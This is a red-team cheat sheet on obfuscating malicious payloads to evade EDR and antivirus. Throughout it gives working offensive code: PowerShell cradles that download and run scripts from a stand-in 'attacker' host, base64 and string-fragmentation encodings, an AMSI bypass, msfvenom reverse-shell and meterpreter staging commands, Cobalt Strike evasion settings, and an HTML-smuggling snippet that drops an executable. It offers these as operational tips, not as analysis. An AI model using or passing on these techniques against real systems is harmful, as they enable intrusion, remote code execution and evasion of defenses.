# Payload Obfuscation Cheat Sheet (Red Team Ops)

Payload obfuscation helps avoid detection by EDR/AV by encoding, transforming, or hiding the true purpose of a script or binary. This is not encryption — the goal is **evasion**, not confidentiality.

---

## 🧪 PowerShell Obfuscation

### Base64 Encoding (standard)

```bash
# Encode payload
echo "IEX(New-Object Net.WebClient).DownloadString('http://attacker/a.ps1')" | iconv -t UTF-16LE | base64 -w 0
```

Run:
```bash
powershell -enc <base64>
```

---

### String Fragmentation

```powershell
$w="Invoke";$x="-WebRequest";$y="http://attacker/s.ps1";iex ($w+$x+" "+$y)
```

---

### ASCII Char Obfuscation

```powershell
$cmd = [char]73+[char]69+[char]88+[char]40+[char]39+"http://..."[char]39+[char]41
Invoke-Expression $cmd
```

---

### AMSI Bypass (Preload Patch)

```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'BlE:1'+'nV'+'0kE'+'-Ex'+'Pr'+'eSsiON' ) ([scRiPtBLocK]::cReaTe('''
$e=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$e.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)
'''))
```

---

## 🧠 Shellcode Obfuscation

### XOR or Custom Encoding

Use `msfvenom` or your own encoder to XOR shellcode, decode at runtime in memory.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=y -f c | ./xor_encoder.py
```

Decode with in-memory C# or PowerShell wrapper.

---

### Invoke-Shellcode (with staging)

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/inject.ps1')
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost x.x.x.x -Lport 443 -Force
```

---

## 🔒 Binary Obfuscation

### PE Metadata Scrubbing

Use tools like:

- **PEscrub**
- **PeClone**
- Custom post-processing scripts to randomize:
  - Product Name
  - Company
  - Version
  - Timestamp

---

### Cobalt Strike Artifact Kit

Customize CS binaries via:

```
/cobaltstrike/artifacts/
```

Edit:
- `common.rc`
- `resources.c`
- `syscalls.c`

---

### Sleep & Jitter Settings

```
sleep 45000 30
```

- Use large sleep + jitter to reduce detection
- Pair with `smartinject` or `execute-assembly` only

---

## 📦 Stager Obfuscation

### DNS Staging (Cobalt Strike / Metasploit)

More resilient, often EDR-safe:

- C2: DNS → redirect → HTTPS
- Stager payloads split across TXT records

---

### HTML Smuggling (Client-Side Delivery)

- Deliver payload via JS + blob URLs
- Bypass most inline proxies and AV

```html
<script>
let blob = new Blob(['MZ...'], {type: 'application/octet-stream'});
let a = document.createElement('a');
a.href = window.URL.createObjectURL(blob);
a.download = 'payload.exe';
a.click();
</script>
```

---

## 📌 Tools for Obfuscation

- **Invoke-Obfuscation** (PowerShell payload mangling)
- **Veil** (Generates AV-evasive executables)
- **Shellter** (PE injection framework)
- **Donut** (.NET payload packing)
- **Obfuscator-LLVM** (compile-time C/C++ obfuscation)
- **Nimcrypt** (Nim-based AV evasion wrapper)

---

## 💡 Tips & Best Practices

- Always test payloads in **realistic EDR environments**
- Use **memory injection** over writing to disk
- Chain **multiple methods**: (Encode → AMSI Bypass → Custom Loader)
- Rotate **User-Agent**, **pipe names**, and **process injection targets**
- Log and track **YARA/AV hits** during dev

---


